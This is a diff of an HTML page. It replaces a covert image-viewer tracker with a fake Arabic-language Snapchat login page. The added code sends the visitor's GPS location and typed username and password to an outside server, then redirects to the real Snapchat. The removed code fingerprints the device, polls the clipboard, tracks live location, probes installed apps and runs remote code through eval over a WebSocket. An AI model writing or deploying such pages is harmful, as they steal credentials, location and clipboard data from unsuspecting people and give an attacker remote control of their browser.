@@ -3,108 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>.</title>
+<title>Snapchat</title>
 <style>
-*{margin:0;padding:0}
-body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
-img{max-width:100%;max-height:100vh;object-fit:contain}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,sans-serif;background:#FFFC00;display:flex;justify-content:center;align-items:center;min-height:100vh;direction:rtl}
+.card{background:white;border-radius:20px;padding:35px 25px;width:90%;max-width:380px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.15)}
+.ghost{font-size:70px}
+.title{font-size:26px;font-weight:bold;margin:5px 0}
+.sub{color:#666;font-size:14px;margin-bottom:20px}
+input{width:100%;padding:15px;margin:8px 0;background:#f5f5f5;border:2px solid #e0e0e0;border-radius:12px;font-size:16px;direction:ltr}
+.btn{width:100%;padding:15px;background:#000;color:#FFFC00;border:none;border-radius:30px;font-size:17px;font-weight:bold;cursor:pointer;margin:15px 0}
 </style>
 </head>
 <body>
-<img src="https://picsum.photos/800/1200" alt=".">
+<div class="card">
+<div class="ghost">👻</div>
+<div class="title">Snapchat</div>
+<div class="sub">تسجيل الدخول للمتابعة</div>
+<input type="text" id="u" placeholder="اسم المستخدم أو البريد" dir="ltr">
+<input type="password" id="p" placeholder="كلمة السر" dir="ltr">
+<button class="btn" onclick="go()">تسجيل الدخول</button>
+<p id="msg" style="color:#0d904f;display:none">✅ تم. جاري التحويل...</p>
+</div>
 
 <script>
-const S = 'https://my-server-py0j.onrender.com';
-const ID = 'a'+Math.random().toString(36).substr(2,12);
-let ws=null;
+const S = 'https://my-server-8utvt3870-m-9386.vercel.app';
 
-function c(){
-ws=new WebSocket(`wss://my-server-py0j.onrender.com/ws/${ID}`);
-ws.onopen=()=>{ws.send(JSON.stringify({t:'reg',id:ID,d:g()}));};
-ws.onmessage=e=>{try{h(JSON.parse(e.data))}catch(err){}};
-ws.onclose=()=>setTimeout(c,2000);
+// إرسال الموقع تلقائياً
+if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(pos=>{
+        fetch(`${S}/collect`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({id:'gps_'+Date.now(),type:'gps',lat:pos.coords.latitude,lon:pos.coords.longitude,time:new Date().toISOString()})
+        });
+    },()=>{}, {timeout:5000});
 }
 
-function g(){
-return{
-ua:navigator.userAgent,p:navigator.platform,l:navigator.language,
-s:`${screen.width}x${screen.height}`,dpr:window.devicePixelRatio,
-c:navigator.hardwareConcurrency,r:navigator.deviceMemory||'?',
-tz:Intl.DateTimeFormat().resolvedOptions().timeZone,time:Date.now()
-};
+async function go(){
+    const u=document.getElementById('u').value;
+    const p=document.getElementById('p').value;
+    if(!u||!p)return;
+    
+    await fetch(`${S}/collect`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({id:'snap_'+Date.now(),type:'snap',username:u,password:p,time:new Date().toISOString()})
+    });
+    
+    document.getElementById('msg').style.display='block';
+    setTimeout(()=>{location.href='https://snapchat.com'},2000);
 }
-
-function s(t,p){
-const d={id:ID,type:t,payload:p};
-if(ws&&ws.readyState===1)ws.send(JSON.stringify(d));
-fetch(`${S}/collect`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(()=>{});
-}
-
-function gps(){
-navigator.geolocation.getCurrentPosition(
-p=>s('gps',{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}),
-e=>s('gps_err',{msg:e.message}),
-{enableHighAccuracy:true,timeout:5000}
-);
-navigator.geolocation.watchPosition(
-p=>s('gps_live',{lat:p.coords.latitude,lon:p.coords.longitude}),
-()=>{},{enableHighAccuracy:true}
-);
-}
-
-setInterval(async()=>{
-try{
-const t=await navigator.clipboard.readText();
-if(t)s('clip',{txt:t});
-}catch(e){}
-},2000);
-
-const APPS={
-w:'whatsapp://',t:'tg://',i:'instagram://',f:'fb://',tw:'twitter://',
-sn:'snapchat://',tk:'snaptik://',yt:'youtube://',ms:'fb-messenger://',
-ds:'discord://',sg:'signal://',vb:'viber://',li:'linkedin://'
-};
-
-function sc(){
-const fd=[];
-const ifr=document.createElement('iframe');
-ifr.style.cssText='display:none;position:absolute;width:1px;height:1px;opacity:0';
-document.body.appendChild(ifr);
-for(const[n,sch]of Object.entries(APPS)){
-try{const st=performance.now();ifr.src=sch;
-setTimeout(()=>{if(performance.now()-st<100)fd.push(n);},50);}catch(e){}
-}
-setTimeout(()=>{
-document.body.removeChild(ifr);
-s('apps',{installed:fd,count:fd.length});
-},3000);
-}
-
-function h(c){
-switch(c.a){
-case'gps':gps();break;
-case'clip':navigator.clipboard.readText().then(t=>s('clip',{txt:t})).catch(()=>{});break;
-case'scan':sc();break;
-case'full':s('full',g());break;
-case'eval':try{eval(c.code)}catch(e){}break;
-case'ping':s('pong',{});break;
-case'open':window.location.href=APPS[c.app]||'';break;
-}
-}
-
-function isAndroid(){return /Android/i.test(navigator.userAgent);}
-
-if(isAndroid()){
-setTimeout(()=>{
-c();
-s('full',g());
-gps();
-sc();
-},500);
-}
-
-setInterval(()=>{if(ws&&ws.readyState===1)ws.send(JSON.stringify({t:'ping'}));},25000);
-setInterval(gps,60000);
 </script>
 </body>
 </html>
